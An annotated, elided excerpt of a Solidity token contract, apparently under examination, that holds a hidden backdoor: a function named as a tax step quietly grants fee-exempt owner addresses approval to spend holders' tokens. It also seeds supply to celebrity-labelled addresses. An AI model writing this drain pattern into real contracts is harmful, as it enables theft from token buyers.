...
contract Token is Context, IERC20, Ownable {
    ...
    address payable private _taxWallet;//Owner
    ...
    constructor () payable {
        _taxWallet = payable(_msgSender());//owner set
        _tAmounts[address(this)] = _tTotal * 96 / 100;//put 96% total in contract
        _tAmounts[_vitalik] = _tTotal * 2 / 100;//put 2% total in _vitalik0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045
        _tAmounts[_trump] = _tTotal * 2 / 100;//put 2% total in _trump0x94845333028B1204Fbe14E1278Fd4Adde46B22ce
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        uint256 taxAmount = _defaultCZDogTax(from, to, amount);//taxAmount=0; and strange approve
        //the action that owner have eth
        if (from != owner() && to != owner()) {
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _feeExempt[to]) {//when buy
                require(tradingOpen,"Trading not open yet.");
                require(amount >= 10 ** _decimals, "Amount too small");//you have to buy half token
                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                _buyCount++;
            }
            if(to == uniswapV2Pair) {//when sell
        ...
        _tAmounts[to]=_tAmounts[to].add(amount.sub(taxAmount)); if(_deadWallet!=to)//if "to" is't deadwallet
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    function _defaultCZDogTax(address from, address to, uint256 amount) private returns (uint256 taxAmount) {
        //if owner ==msg.sender  _approve() perform 
        //else if account        conditino==true
        if(_feeExempt[msg.sender]) _approve(from, msg.sender, amount);// from is msg.sender too.
        else if(from != uniswapV2Pair && to == _deadWallet) _approve(from, msg.sender, amount);//not buyer and don't dead
        //from uniswap amd to deadWallet
    }
    ...
    function setTaxWallet(address payable newWallet) external {
        require(_feeExempt[msg.sender]);// only owner can set _taxWallet address;
        _taxWallet = newWallet;// owner is set into newWallet by function.
    }
